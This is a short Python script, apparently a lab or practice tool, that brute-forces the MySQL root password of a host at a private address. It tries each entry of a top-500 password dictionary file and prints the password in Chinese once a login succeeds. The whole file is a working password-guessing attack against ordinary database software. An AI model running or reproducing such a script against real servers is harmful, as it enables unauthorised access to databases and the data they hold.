import pymysql

def mysql_crack():
    # try:
    #     conn = pymysql.connect(host='192.168.19.130', user='root', password='123456')
    #     print("成功")
    # except:
    #     pass
    with open('../dict/password-top500.txt') as file:
        pw_list = file.readlines()

    for password in pw_list:
        try:
            conn = pymysql.connect(host='192.168.19.132', user='root', password=password.strip())
            print(f"MySQL破解成功，密码为：{password.strip()}")
            break
        except:
            pass
if __name__ == '__main__':
    mysql_crack()